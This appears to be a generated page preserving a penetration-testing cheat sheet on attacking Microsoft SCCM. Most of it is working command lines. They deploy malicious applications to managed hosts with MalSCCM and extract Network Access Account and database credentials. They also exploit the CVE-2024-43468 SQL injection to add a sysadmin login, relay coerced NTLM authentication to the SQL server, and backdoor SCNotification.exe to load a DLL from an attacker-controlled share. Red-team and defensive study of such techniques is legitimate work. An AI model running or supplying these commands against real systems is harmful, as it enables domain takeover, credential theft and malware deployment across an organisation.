---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Deployment - SCCM

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-deployment-sccm` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/deployment-sccm.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Deployment - SCCM](../../topics/active-directory/deployment-sccm.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-deployment-sccm |
| name | Deployment - SCCM |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/deployment-sccm.md |

## Preserved Source Material

````yaml
_body: "# Deployment - SCCM\n\n> SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.\n\
  \n## SCCM Application Deployment\n\n> Application Deployment is a process that involves packaging software applications\
  \ and distributing them to selected computers or devices within an organization\n\n**Tools**:\n\n* [PowerShellMafia/PowerSCCM\
  \ - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)\n* [nettitude/MalSCCM\
  \ - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage](https://github.com/nettitude/MalSCCM)\n\
  \n**Exploitation**:\n\n* Using **SharpSCCM**\n\n  ```ps1\n  .\\SharpSCCM.exe get devices --server <SERVER8NAME> --site-code\
  \ <SITE_CODE>\n  .\\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>\n  .\\SharpSCCM.exe exec\
  \ -d WS01 -p \"C:\\Windows\\System32\\ping 10.10.10.10\" -s --debug\n  ```\n\n* Compromise client, use locate to find management\
  \ server\n\n    ```ps1\n    MalSCCM.exe locate\n    ```\n\n* Enumerate over WMI as an administrator of the Distribution\
  \ Point\n\n    ```ps1\n    MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups\n    ```\n\n* Compromise\
  \ management server, use locate to find primary server\n* Use `inspect` on primary server to view who you can target\n\n\
  \    ```ps1\n    MalSCCM.exe inspect /all\n    MalSCCM.exe inspect /computers\n    MalSCCM.exe inspect /primaryusers\n \
  \   MalSCCM.exe inspect /groups\n    ```\n\n* Create a new device group for the machines you want to laterally move too\n\
  \n    ```ps1\n    MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device\n    MalSCCM.exe inspect /groups\n\
  \    ```\n\n* Add your targets into the new group\n\n    ```ps1\n    MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL\n\
  \    ```\n\n* Create an application pointing to a malicious EXE on a world readable share : `SCCMContentLib$`\n\n    ```ps1\n\
  \    MalSCCM.exe app /create /name:demoapp /uncpath:\"\\\\BLORE-SCCM\\SCCMContentLib$\\localthread.exe\"\n    MalSCCM.exe\
  \ inspect /applications\n    ```\n\n* Deploy the application to the target group\n\n    ```ps1\n    MalSCCM.exe app /deploy\
  \ /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment\n    MalSCCM.exe inspect /deployments\n    ```\n\n\
  * Force the target group to checkin for updates\n\n    ```ps1\n    MalSCCM.exe checkin /groupname:TargetGroup\n    ```\n\
  \n* Cleanup the application, deployment and group\n\n    ```ps1\n    MalSCCM.exe app /cleanup /name:demoapp\n    MalSCCM.exe\
  \ group /delete /groupname:TargetGroup\n    ```\n\n## SCCM Enumeration\n\n* [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)\
  \ - SCCMHunter is a post-ex tool built to streamline identifying, profiling, and attacking SCCM related assets in an Active\
  \ Directory domain.\n\n    ```ps1\n    sccmhunter.py find -u user -p P@ssw0rd -dc-ip 10.10.10.10 -d lab.lan\n    sccmhunter.py\
  \ show -siteservers\n    ```\n\n## SCCM Shares\n\n> Find interesting files stored on (System Center) Configuration Manager\
  \ (SCCM/CM) SMB shares\n\n* [1njected/CMLoot](https://github.com/1njected/CMLoot)\n\n  ```ps1\n  Invoke-CMLootInventory\
  \ -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt\n  Invoke-CMLootDownload -SingleFile \\\\sccm\\SCCMContentLib$\\\
  DataLib\\SC100001.1\\x86\\MigApp.xml\n  Invoke-CMLootDownload -InventoryFile .\\sccmfiles.txt -Extension msi\n  ```\n\n\
  ## SCCM Configuration Manager\n\n* [subat0mik/Misconfiguration-Manager/MisconfigurationManager.ps1](https://github.com/subat0mik/Misconfiguration-Manager)\
  \ - Misconfiguration Manager is a central knowledge base for all known Microsoft Configuration Manager tradecraft and associated\
  \ defensive and hardening guidance.\n\n### CRED-1 Retrieve credentials via PXE boot media\n\n* [Misconfiguration-Manager\
  \ - CRED-1](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-1/cred-1_description.md)\n\
  \n**Requirements**:\n\n* On the SCCM Distribution Point: `HKLM\\Software\\Microsoft\\SMS\\DP\\PxeInstalled` = 1\n* On the\
  \ SCCM Distribution Point: `HKLM\\Software\\Microsoft\\SMS\\DP\\IsPxe` = 1\n* PXE-enabled distribution point\n\n**Exploitation**:\n\
  \n* [csandker/pxethiefy](https://github.com/csandker/pxethiefy)\n\n    ```ps1\n    sudo python3 pxethiefy.py explore -i\
  \ eth0\n    ```\n\n* [MWR-CyberSec/PXEThief](https://github.com/MWR-CyberSec/PXEThief)\n\n### CRED-2 Request a policy containing\
  \ credentials\n\n* [Misconfiguration-Manager - CRED-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md)\n\
  \n**Requirements**:\n\n* PKI certificates are not required for client authentication\n* Domain accounts credential\n\n**Exploitation**:\n\
  \nCreate a machine or compromise an existing one, then request policies such as `NAAConfig`\n\nEasy mode using `SharpSCCM`\n\
  \n```ps1\naddcomputer.py -computer-name 'attacker$' -computer-pass P@ssw0rd -dc-ip 10.10.10.10 lab.lan/user:'P@ssw0rd'\n\
  SharpSCCM.exe get naa -r newdevice -u attacker$ -p P@ssw0rd\nSharpSCCM get naa\nSharpSCCM get secrets -u <username-machine-$>\
  \ -p <password>\n```\n\nStealthy mode by creating a computer.\n\n* Create a machine account with a specific password: `addcomputer.py\
  \ -computer-name 'customsccm$' -computer-pass 'YourStrongPassword123*' 'sccm.lab/carol:SCCMftw' -dc-ip 192.168.33.10`\n\
  * In your `/etc/hosts` file, add an entry for the MECM server: `192.168.33.11 MECM MECM.SCCM.LAB`\n* Use `sccmwtf` to request\
  \ a policy: `python3 sccmwtf.py fake fakepc.sccm.lab MECM 'SCCMLAB\\customsccm$' 'YourStrongPassword123*'`\n* Parse the\
  \ policy to extract the credentials and decrypt them using [sccmwtf/policysecretunobfuscate.py](https://github.com/xpn/sccmwtf/blob/main/policysecretunobfuscate.py):\
  \ `cat /tmp/naapolicy.xml |grep 'NetworkAccessUsername\\|NetworkAccessPassword' -A 5 |grep -e 'CDATA' | cut -d '[' -f 3|cut\
  \ -d ']' -f 1| xargs -I {} python3 policysecretunobfuscate.py {}`\n\n### CRED-3 Extract currently deployed credentials stored\
  \ as DPAPI blobs\n\n> Dump currently deployed secrets via WMI. If you can escalate on a host that is an SCCM client, you\
  \ can retrieve plaintext domain credentials.\n\n* [Misconfiguration-Manager - CRED-3](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-3/cred-3_description.md)\n\
  \n**Requirements**:\n\n* Local administrator privileges on an SCCM client\n\n**Exploitation**:\n\n* Find SCCM blob\n\n \
  \   ```ps1\n    Get-Wmiobject -namespace \"root\\ccm\\policy\\Machine\\ActualConfig\" -class \"CCM_NetworkAccessAccount\"\
  \n    NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>\n    NetworkAccessUsername : <![CDATA[E600000001...00F92]]>\n\
  \    ```\n\n* Using [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244)\n\
  \n    ```ps1\n    $str = \"060...F2DAF\"\n    $bytes = for($i=0; $i -lt $str.Length; $i++) {[byte]::Parse($str.Substring($i,\
  \ 2), [System.Globalization.NumberStyles]::HexNumber); $i++}\n    $b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])\n\
  \    .\\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt    \n    ```\n\n* Using [Mayyhem/SharpSCCM](https://github.com/Mayyhem/SharpSCCM)\
  \ for SCCM retrieval and decryption\n\n    ```ps1\n    .\\SharpSCCM.exe local secrets -m wmi\n    ```\n\nFrom a remote machine.\n\
  \n* Using [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)\n\n    ```ps1\n    python3 ./sccmhunter.py\
  \ http -u \"administrator\" -p \"P@ssw0rd\" -d internal.lab -dc-ip 10.10.10.10. -auto\n    ```\n\n### CRED-4 Extract legacy\
  \ credentials stored as DPAPI blobs\n\n* [Misconfiguration-Manager - CRED-4](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-4/cred-4_description.md)\n\
  \n**Requirements**:\n\n* Local administrator privileges on an SCCM client\n\n**Exploitation**:\n\n* Search the database\
  \ using `SharpDPAPI`\n\n    ```ps1\n    .\\SharpDPAPI.exe search /type:file /path:C:\\Windows\\System32\\wbem\\Repository\\\
  OBJECTS.DATA\n    ```\n\n* Search the database using `SharpSCCM`\n\n    ```ps1\n    .\\SharpSCCM.exe local secrets -m disk\n\
  \    ```\n\n* Check ACL for the CIM repository located at `C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA`:\n\n \
  \   ```ps1\n    Get-Acl C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA | Format-List -Property PSPath,sddl\n    ConvertFrom-SddlString\
  \ \"\"\n    ```\n\n### CRED-5 Extract the SC_UserAccount table from the site database\n\n* [Misconfiguration-Manager - CRED-5](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-5/cred-5_description.md)\n\
  \n**Requirements**:\n\n* Site database access\n* Primary site server access\n    * Access to the private key used for encryption\n\
  \n**Exploitation**:\n\n* [gentilkiwi/mimikatz](https://twitter.com/gentilkiwi/status/1392204021461569537)\n\n    ```ps1\n\
  \    mimikatz # misc::sccm /connectionstring:\"DRIVER={SQL Server};Trusted=true;DATABASE=ConfigMgr_CHQ;SERVER=CM1;\"\n \
  \   ```\n\n* [skahwah/SQLRecon](https://github.com/skahwah/SQLRecon), only if the site server and database are hosted on\
  \ the same system\n\n    ```ps1\n    SQLRecon.exe /auth:WinToken /host:CM1 /database:ConfigMgr_CHQ /module:sDecryptCredentials\n\
  \    ```\n\n* SQLRecon + [xpn/sccmdecryptpoc.cs](https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1)\n\n    ```ps1\n\
  \    SQLRecon.exe /auth:WinToken /host:<SITE-DB> /database:CM_<SITECODE> /module:query /command:\"SELECT * FROM SC_UserAccount\"\
  \n    sccmdecryptpoc.exe 0C010000080[...]5D6F0\n    ```\n\n### Unauthenticated SQL Injection - CVE-2024-43468\n\n* [synacktiv/CVE-2024-43468](https://github.com/synacktiv/CVE-2024-43468)\
  \ - Microsoft Configuration Manager (ConfigMgr / SCCM) 2403 Unauthenticated SQL injections (CVE-2024-43468) exploit\n\n\
  ```ps1\n$ CVE-2024-43468.py -t cmc.corp.local -sql \"create login [CORP\\user1] from windows ; exec master.dbo.sp_addsrvrolemember\
  \ [CORP\\user1], 'sysadmin'\"\n$ mssqlclient.py -debug -windows-auth 'CORP/user1:xxx'@cmc-db.corp.local\nSQL> select name\
  \ from sysdatabases where name like 'CM_%'\n```\n\n## SCCM Relay\n\n### TAKEOVER1 - Low Privileges to Database Administrator\
  \ - MSSQL relay\n\n**Requirements**:\n\n* Database separated from the site server\n* Server site is sysadmin of the database\n\
  \n**Exploitation**:\n\n* Generate the query to elevate our user:\n\n    ```ps1\n    python3 sccmhunter.py mssql -u carol\
  \ -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10 -debug -tu carol -sc P01 -stacked\n    ```\n\n* Setup a relay with the generated\
  \ query:\n\n    ```ps1\n    ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q \"USE CM_P01; INSERT INTO RBAC_Admins\
  \ (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\\\
  carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT\
  \ AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions\
  \ (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\\carol'),'SMS0001R','SMS00001','1');\
  \ INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE\
  \ LogonName = 'SCCMLAB\\carol'),'SMS0001R','SMS00004','1');\"\n    ```\n\n* Coerce an authentication to your listener using\
  \ a domain account:\n\n    ```ps1\n    petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11\n    ```\n\
  \n* Finally, connect as admin on the MSSQL server:\n\n    ```ps1\n    python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw'\
  \ -ip 192.168.33.11\n    ```\n\n### TAKEOVER2 - Low Privileges to MECM Admin Account - SMB relay\n\nMicrosoft requires the\
  \ site server's computer account to be an administrator on the MSSQL server.\n\n**Exploitation**:\n\n* Start a listener\
  \ for the MSSQL Server: `ntlmrelayx -t 192.168.33.12 -smb2support -socks`\n* Coerce an authentication from the Site Server\
  \ using domain credentials (low privileges SCCM NAA retrieved on the same machine works great): `petitpotam.py -d sccm.lab\
  \ -u sccm-naa -p 123456789 192.168.33.1 192.168.33.11`\n* Finally use the SOCKS from `ntlmrelayx` to access the MSSQL server\
  \ as a local administrator\n\n    ```ps1\n    proxychains -q smbexec.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 \n    proxychains\
  \ -q secretsdump.py -no-pass SCCMLAB/'MECM$'@192.168.33.12 \n    ```\n\n### ELEVATE 2 - NTLM Relay with Automatic Client\
  \ Push Authentication\n\n**Requirements**:\n\n* Automatic site-wide client push installation enabled\n* Automatic site device\
  \ approval\n* Fallback authentication to NTLM\n\n**Exploitation**:\n\n```ps1\nSharpSCCM.exe invoke client-push -t 192.168.1.50\n\
  ntlmrelayx.py -t mssql01.lab.lan -smb2support\n```\n\n## SCCM Persistence\n\n* [mandiant/CcmPwn](https://github.com/mandiant/CcmPwn)\
  \ - lateral movement script that leverages the CcmExec service to remotely hijack user sessions.\n\nCcmExec is a service\
  \ native to SCCM Windows clients that is executed on every interactive session. This technique requires Adminsitrator privileges\
  \ on the targeted machine.\n\n* Backdoor the `SCNotification.exe.config` to load your DLL\n\n    ```ps1\n    python3 ccmpwn.py\
  \ domain/user:password@workstation.domain.local exec -dll evil.dll -config exploit.config\n    ```\n\n* Malicious config\
  \ to force `SCNotification.exe` to load a file from an attacker-controlled file share\n\n    ```ps1\n    python3 ccmpwn.py\
  \ domain/user:password@workstation.domain.local coerce -computer 10.10.10.10\n    ```\n\n## References\n\n* [Attacking and\
  \ Defending Configuration Manager - An Attackers Easy Win - Logan Goins - April 25, 2025](https://logan-goins.com/2025-04-25-sccm/)\n\
  * [Decrypting the Forest From the Trees - Garrett Foster - March 6, 2025](https://specterops.io/blog/2025/03/06/decrypting-the-forest-from-the-trees/)\n\
  * [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - May 13, 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)\n\
  * [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - July 9, 2022](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)\n\
  * [Further Adventures With CMPivot — Client Coercion - Diego Lomellini - February 3, 2025](https://posts.specterops.io/further-adventures-with-cmpivot-client-coercion-38b878b740ac)\n\
  * [Introducing ConfigManBearPig, a BloodHound OpenGraph Collector for SCCM - Chris Thompson - January 13, 2026](https://specterops.io/blog/2026/01/13/introducing-configmanbearpig-a-bloodhound-opengraph-collector-for-sccm/)\n\
  * [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)\n* [Misconfiguration\
  \ Manager: Overlooked and Overprivileged - Duane Michael - March 5, 2024](https://posts.specterops.io/misconfiguration-manager-overlooked-and-overprivileged-70983b8f350d)\n\
  * [Network Access Accounts are evil… - Roger Zander - September 13, 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)\n\
  * [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - June 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)\n\
  * [SCCM / MECM LAB - Part 0x0 - mayfly - March 23, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x0/)\n* [SCCM /\
  \ MECM LAB - Part 0x1 - Recon and PXE - mayfly - March 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x1/)\n\
  * [SCCM / MECM LAB - Part 0x2 - Low user - mayfly - March 28, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x2/)\n\
  * [SCCM / MECM LAB - Part 0x3 - Admin User - mayfly - April 3, 2024](https://mayfly277.github.io/posts/SCCM-LAB-part0x3/)\n\
  * [SeeSeeYouExec: Windows Session Hijacking via CcmExec - Andrew Oliveau - March 28, 2024](https://cloud.google.com/blog/topics/threat-intelligence/windows-session-hijacking-via-ccmexec?hl=en)\n\
  * [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - June 28, 2022](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)"
_relative_path: active-directory/deployment-sccm.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/deployment-sccm.md
````
